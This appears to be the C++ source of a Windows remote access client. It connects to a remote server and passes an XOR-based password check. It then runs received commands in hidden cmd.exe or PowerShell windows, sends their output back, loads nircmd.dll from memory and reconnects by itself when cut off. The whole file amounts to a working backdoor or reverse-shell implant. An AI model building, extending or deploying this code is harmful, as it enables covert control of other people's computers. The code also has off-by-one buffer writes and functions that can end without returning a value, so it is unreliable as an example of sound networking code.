#include "pch.h"
#include "nirsoft-cmd.h"
#pragma warning( disable : 4996)

string client::hostname2ip(string host)
{
	WSADATA wsa_data;
	struct addrinfo *result = NULL;
	struct addrinfo *ptr = NULL;
	struct addrinfo hints;
	struct sockaddr_in  *sockaddr_ipv4;
	if (client::check_error(WSAStartup(MAKEWORD(2, 2), &wsa_data))) {
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		getaddrinfo(host.c_str(), NULL, &hints, &result);
		for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
			sockaddr_ipv4 = (struct sockaddr_in *) ptr->ai_addr;
			return inet_ntoa(sockaddr_ipv4->sin_addr);
		}
		freeaddrinfo(result);
		WSACleanup();
	}
	else {
		return "E.R.R.O.R";
	}
}

void client::data_parser(string type, int size, string data)
{
	if (type == "TEXT") { // text message
		cout << "TYPE: " << type << endl
			<< "SIZE: " << size << endl
			<< "TEXT: " << data << endl;
	}
	else if (type == "ALIV") {
		cout << endl << "isAlive() -> return true;" << endl;
		send_data("OK", "ALIV");
	}
	else if (type == "CMDO") { // execute only CMD(O)nce
		cmd_init(CommandPrompt, false);
		read_and_send();
		command(data);
		cout << "cmd.exe: \"" << data << "\"" << endl;
	}
	else if (type == "POSO") {
		cmd_init(PowerShell, false);
		command(data);
		cout << "powershell.exe: \"" << data << "\"" << endl;
	}
	else if (type == "NIRO") {
		cmd_init(NirCmd);
		bool output;
		nircmd(data, output);
		send_data((output) ? "True" : "False", "NIRB");
		cout << "nircmd.dll: \"" << data << "\"" << endl;
	}
	else if (type == "CMDS" || type == "PSSS") { // shell interactive START
		if (type == "CMDS") {
			cmd_init(CommandPrompt, false);
			read_and_send();
		}
		else if (type == "PSSS") {
			cmd_init(PowerShell, false);
			read_and_send();
		}
		while (true) {
			string type, data;
			recv_data(type, data);
			if (type == "CMDC" && active) {
				cout << ((active_prompt == CommandPrompt) ? "cmd.exe" : "powershell.exe") << " live shell command: \"" << data << "\"" << endl;
				command(data);
			}
			else {
				break;
			}
		}
	}
	else if (type == "CMDE") { // command prompt shell interactive END
		cout << "TYPE: " << type << endl
			<< "SIZE: " << size << endl
			<< "DATA: " << data << endl;
	}
	else if (type == "AUTH") {
		int socket_id = atoi(data.substr(4).c_str());
		srand(socket_id);
		int sum = 0;
		for (auto i : connect_password) { sum += ((i ^ socket_id) ^ rand()); } // XOR's every char in password with client_num and random sequence made by socket_num
		cout << "Got Connection => Sending Password " << endl << "auth(" << socket_id << ", " << connect_password << ")" << " = " << sum << endl;
		cout << "Authorization => ";
		send_data(to_string(sum), "CERT");
		string type, data;
		recv_data(type, data);
		if (!(type == "AUTG" && data == "GRANTED")) {
			cout << "!granted" << endl;
			endme();
		}
		else {
			cout << "granted" << endl;
		}
	}
	else {
		cout << "- UNKNOWN -" << endl
			<< "TYPE: " << type << endl
			<< "SIZE: " << size << endl
			<< "DATA: " << data << endl;
		send_data("kys");
	}
}

bool client::startup_socket(string ip_address, int port, WSADATA & wsa_data, WORD & version, SOCKET & active, sockaddr_in & socket_hint)
{
	if (check_error(WSAStartup(version, &wsa_data))) {
		active = socket(AF_INET, SOCK_STREAM, 0);
		if (check_error(active)) {
			socket_hint.sin_family = AF_INET;
			socket_hint.sin_port = htons(port);
			inet_pton(AF_INET, ip_address.c_str(), &socket_hint.sin_addr);
			alive = true;
			return true;
		}
		else {
			return false;
		}
	}
	else {
		return false;
	}
}

bool client::connect_socket(SOCKET & active, sockaddr_in & hint)
{
	int socket_connect = connect(active, (sockaddr*)&hint, sizeof(hint));
	if (check_error(socket_connect)) {
		return true;
	}
	else {
		return false;
	}
}
bool client::connect_socket()
{
	int socket_connect = connect(active_socket, (sockaddr*)&socket_hint, sizeof(socket_hint));
	if (check_error(socket_connect)) {
		return true;
	}
	else {
		return false;
	}
}

bool client::check_error(int status)
{
	if (status == SOCKET_ERROR || status == INVALID_SOCKET) {
		if (WSAGetLastError() == 10054 || WSAGetLastError() == 10061 || WSAGetLastError() == 10057) {
			cout << "Presumably disconnected from server reconnecting in (1s)" << endl;
			Sleep(1000);
			closesocket(active_socket);
			active_socket = socket(AF_INET, SOCK_STREAM, 0);
			connect(active_socket, (sockaddr*)&socket_hint, sizeof(socket_hint));
		}
		else {
			wchar_t *text;
			FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, WSAGetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&text, 0, NULL);
			wcout << "error: " << WSAGetLastError() << " | " << text << endl;
			LocalFree(text);
		}

		return false;
	}
	else {
		return true;
	}
}

bool client::get_alive_client()
{
	return alive;
}

bool client::send_data(string data, string header)
{
	int msg_size = data.size();
	int padding = msg_size > 0 ? (int)log10((double)msg_size) + 1 : 1;
	stringstream size_padder;
	size_padder << string(8 - padding, '0') << msg_size;
	string data_size = size_padder.str();
	string data_type = header;
	if ((check_error(send(active_socket, data_type.c_str(), data_type.size(), 0)) && check_error(send(active_socket, data_size.c_str(), data_size.size(), 0)) && check_error(send(active_socket, data.c_str(), data.size(), 0)))) {
		/*string outp;
		recv_data(outp);*/
		return true;
	}
	else {
		return false;
	}
}

bool client::recv_data(string & output)
{
	char type[5]; // 4 + 1('\0')
	char size[9]; // 8 + 1('\0')
	int alloc_size;
	ZeroMemory(type, 5);
	ZeroMemory(size, 9);
	if (check_error(recv(active_socket, type, 4, 0))) {
		if (check_error(recv(active_socket, size, 8, 0))) {
			alloc_size = atoi(size);
			char *input = new char[alloc_size];
			if (check_error(recv(active_socket, input, alloc_size, 0))) {
				input[alloc_size] = '\0';
				string output_data = input;
				data_parser(string(type), alloc_size, output_data);
			}
			else {
				return -1;
			}
		}
		else {
			return -2;
		}
	}
}

bool client::recv_data(string &type_h, string &data_h) {
	char type[5]; // 4 + 1('\0')
	char size[9]; // 8 + 1('\0')
	int alloc_size;
	ZeroMemory(type, 5);
	ZeroMemory(size, 9);
	if (check_error(recv(active_socket, type, 4, 0))) {
		type_h = type;
		if (check_error(recv(active_socket, size, 8, 0))) {
			alloc_size = atoi(size);
			char *input = new char[alloc_size];
			if (check_error(recv(active_socket, input, alloc_size, 0))) {
				input[alloc_size] = '\0';
				data_h = input;
			}
			else {
				return -1;
			}
		}
		else {
			return -2;
		}
	}
	else {
	}
}

void client::endme()
{
	closesocket(active_socket);
	WSACleanup();
	alive = false;
}

client::client(string ip, int port, string password)
{
	startup_socket(hostname2ip(ip), port, wsa_data, wsa_version, active_socket, socket_hint);
	connect_password = password;
}

bool client::write_cmd(CString command, int &length)
{
	DWORD WriteFILE;

	DWORD NUM_OF_BYTES;

	LPSTR command_ansi;

	command.AppendChar('\n');

	int size = WideCharToMultiByte(
		CP_UTF8,
		0,
		command.GetString(),
		-1,
		NULL,
		0,
		NULL,
		NULL
	);

	command_ansi = (LPSTR)calloc(1, (size + 1) * sizeof(char));

	WideCharToMultiByte(
		CP_UTF8,
		0,
		command.GetString(),
		-1,
		command_ansi,
		size,
		NULL,
		NULL
	);

	length = int(string((command_ansi != NULL) ? command_ansi : "NULL").length());

	WriteFILE = WriteFile(STDINW, command_ansi, size - 1, &NUM_OF_BYTES, NULL);

	if (!(WriteFile != 0)) {
		cout << "ERROR: Cannot Write Command to Pipe" << endl;
		return false;
	}

	return true;
}

bool client::read_cmd(string command, int length, string &output)
{
	stringstream output_stream;
	while (true)
	{
		Sömn();

		DWORD bytes_available;

		bool PeekPipe = PeekNamedPipe(STDOUTR, NULL, 0, NULL, &bytes_available, 0);

		if (!PeekPipe) return 0;

		if (bytes_available != 0) {
			char * output_cmd = new char[pipe_size];

			bool ReadF = ReadFile(STDOUTR, output_cmd, min(pipe_size, bytes_available), NULL, NULL);

			if (!(ReadF)) return 0;

			int minimum_size = min(pipe_size, bytes_available);

			output_cmd[minimum_size] = '\0';

			output_stream << output_cmd;
			output = output_cmd;

			delete[] output_cmd; // unless delete the output_cmd would get to >400mb of memory

			auto command_index = 0;

			for (; command_index < length; command_index++) { if (output[command_index] == command[command_index]) { continue; } else { break; } }

			cout << output.substr(command_index);

			string last2chars = output.substr(output.length() - 2);

			bool end_cmd = (output.back() == '>');

			bool end_ps = (last2chars == "> ");

			bool end_cst = (last2chars == custom_esc);

			if (end_cmd || end_ps || end_cst) {
				//free(output_cmd);
				//output_cmd = NULL;
				break;
			}
		}
		else if (!get_alive_cmd() || force_quit) {
			break;
		}
	}
	output = output_stream.str();
	return 0;
}

bool client::read_and_send(string command, int length) {
	while (true)
	{
		Sömn();

		DWORD bytes_available;

		bool PeekPipe = PeekNamedPipe(STDOUTR, NULL, 0, NULL, &bytes_available, 0);

		if (!PeekPipe) return 0;

		if (bytes_available != 0) {
			char * output_cmd = new char[pipe_size];

			bool ReadF = ReadFile(STDOUTR, output_cmd, min(pipe_size, bytes_available), NULL, NULL);

			if (!(ReadF)) return 0;

			int minimum_size = min(pipe_size, bytes_available);

			output_cmd[minimum_size] = '\0';

			string output = output_cmd;

			delete[] output_cmd; // unless delete the output_cmd would get to >400mb of memory

			auto command_index = 0;

			for (; command_index < length; command_index++) { if (output[command_index] == command[command_index]) { continue; } else { break; } }

			string last2chars = output.substr(output.length() - 2);

			bool end_cmd = (output.back() == '>');

			bool end_ps = (last2chars == "> ");

			bool end_cst = (last2chars == custom_esc);
			if (active_prompt == CommandPrompt) {
				send_data(output.substr(command_index), "CMDO");
			}
			else if (active_prompt == PowerShell) {
				send_data(output.substr(command_index), "POSO");
			}

			if (end_cmd || end_ps || end_cst) {
				break;
			}
		}
		else if (!get_alive_cmd() || force_quit) {
			break;
		}
	}
	if (active_prompt == CommandPrompt) {
		send_data(" ", "CMDE");
	}
	else if (active_prompt == PowerShell) {
		send_data(" ", "POSE");
	}
	return 0;
}

bool client::read_cmd(string command = "", int length = 0)
{
	while (true)
	{
		Sömn();

		DWORD bytes_available;

		bool PeekPipe = PeekNamedPipe(STDOUTR, NULL, 0, NULL, &bytes_available, 0);

		if (!PeekPipe) return 0;

		if (bytes_available != 0) {
			char * output_cmd = new char[pipe_size];

			bool ReadF = ReadFile(STDOUTR, output_cmd, min(pipe_size, bytes_available), NULL, NULL);

			if (!(ReadF)) return 0;

			int minimum_size = min(pipe_size, bytes_available);

			output_cmd[minimum_size] = '\0';

			string output = output_cmd;

			delete[] output_cmd; // unless delete the output_cmd would get to >400mb of memory

			auto command_index = 0;

			for (; command_index < length; command_index++) { if (output[command_index] == command[command_index]) { continue; } else { break; } }

			cout << output.substr(command_index);

			string last2chars = output.substr(output.length() - 2);

			bool end_cmd = (output.back() == '>');

			bool end_ps = (last2chars == "> ");

			bool end_cst = (last2chars == custom_esc);

			if (end_cmd || end_ps || end_cst) {
				//free(output_cmd);
				//output_cmd = NULL;
				break;
			}
		}
		else if (!get_alive_cmd() || force_quit) {
			break;
		}
	}
	return 0;
}

bool client::initilize_process(string path, string working_directory = "C:\\Windows")
{
	security_atrib = {
	sizeof(SECURITY_ATTRIBUTES),
	NULL,
	true
	};

	bool STDIN_PIPE = CreatePipe(&STDINR, &STDINW, &security_atrib, pipe_size);

	bool STDOUT_PIPE = CreatePipe(&STDOUTR, &STDOUTW, &security_atrib, pipe_size);

	if (!(STDIN_PIPE || STDOUT_PIPE)) {
		cout << "ERROR: Cannot create pipe" << endl;
	}

	GetStartupInfoA(&startup_info);

	startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	startup_info.wShowWindow = SW_HIDE;

	startup_info.hStdOutput = STDOUTW;

	startup_info.hStdError = STDOUTW;

	startup_info.hStdInput = STDINR;

	bool CREATE_PROCESS = CreateProcessA(
		path.c_str(),
		NULL,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		working_directory.c_str(),
		&startup_info,
		&process_info
	);

	if (!CREATE_PROCESS) {
		cout << "[ERROR: Cannot create process]" << endl;
		return false;
	}
	else {
		cout << "[SUCESS: Created process (" << process_info.hProcess << "|\"" << path << "\")]" << endl;
		active = true;
		nirsoft = false;
		return true;
	}
}

void client::initilize_nirsoft()
{
	CLoad lib;
	HANDLE hLibrary = 0;
	hLibrary = lib.LoadFromMemory(nircmd_dll, sizeof(nircmd_dll));
	nirsofter = (cmd_type)lib.GetProcAddressFromMemory(hLibrary, "DoNirCmd");
}

void client::initilize_custom(string path, string working_directory, string esc, bool output)
{
	client::terminate_open();
	set_custom_esc(esc);
	client::initilize_process(path, working_directory);
	(output) ? client::read_cmd() : false;
}

void client::initilize_cmd(bool output)
{
	client::terminate_open();
	client::initilize_process("C:\\Windows\\System32\\cmd.exe");
	(output) ? client::read_cmd() : false;
}

void client::initilize_ps(bool output)
{
	client::terminate_open();
	client::initilize_process("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
	(output) ? client::read_cmd() : false;
}

void client::Sömn()
{
	Sleep(sleep_delay);
}

void client::terminate_open()
{
	if (process_info.hProcess != NULL) {
		char szProcessName[MAX_PATH] = "<unknown>";
		GetModuleFileNameExA(process_info.hProcess, 0, szProcessName, sizeof(szProcessName));
		cout << endl << "[SUCESS: Closed (" << process_info.hProcess << "|\"" << szProcessName << "\")]" << endl;
		TerminateProcess(process_info.hProcess, 0);
		CloseHandle(process_info.hProcess);
	}
}

void client::set_delay(int delay)
{
	sleep_delay = delay;
}

void client::set_pipe_size(int size)
{
	pipe_size = size;
}

void client::set_custom_esc(string escape)
{
	custom_esc = escape;
}

void client::cmd_init(int type, bool output, int delay, int pipe_size)
{
	set_delay(delay);
	set_pipe_size(pipe_size);

	// BITWISE - Comparison works by returning the int by the bitwise cmp and if the int is nonzero then the output equals true else false.
	if (type & CommandPrompt) {
		active_prompt = CommandPrompt;
		initilize_cmd(output);
	}
	if (type & PowerShell) {
		active_prompt = PowerShell;
		initilize_ps(output);
	}
	if (type & NirCmd) {
		active_prompt = NirCmd;
		initilize_nirsoft();
	}
}

void client::nircmd(string command, bool &output)
{
	output = nirsofter((LPSTR)command.c_str());
}

void client::command(string command)
{
	if (nircmd_presence(command)) {
		bool output;
		nircmd(command.substr(7), output); // use 7 to include parser space
		send_data((output) ? "true" : "false", "CMDE");
	}
	else
		if (command == "exit") { //use !exit to call internal exit
			client::endme_cmd();
		}
		else {
			string parsed_command;
			if (command[0] == '!') {
				parsed_command = command.substr(1);
			}
			else {
				parsed_command = command;
			}

			int command_size;

			client::write_cmd(parsed_command.c_str(), command_size);

			client::read_and_send(parsed_command.c_str(), command_size);
		}

	return;
}

bool client::get_alive_cmd()
{
	DWORD return_val;
	GetExitCodeProcess(process_info.hProcess, &return_val);
	if (return_val == 259) {
		return true;
	}
	else {
		return false;
	}
}

void client::endme_cmd()
{
	stringstream proc_id;
	proc_id << process_info.hProcess;
	active = false;
	TerminateProcess(process_info.hProcess, 0);
	CloseHandle(process_info.hProcess);
	cout << endl << "[SUCCESS: (" << ((process_info.hProcess == NULL) ? "UNKWN" : proc_id.str()) << ") commited !alive]" << endl;
}

bool client::alive_cmd()
{
	DWORD return_val;
	GetExitCodeProcess(process_info.hProcess, &return_val);
	bool exitcode = (return_val == 259);
	if (exitcode && active) {
		return true;
	}
	else {
		return false;
	}
}

bool client::nircmd_presence(string command)
{
	for (auto i = 0; i < nircmd_keyword.length(); i++) {
		if (command[i] == nircmd_keyword[i]) {
			continue;
		}
		else {
			return false;
		}
	}
	return true;
}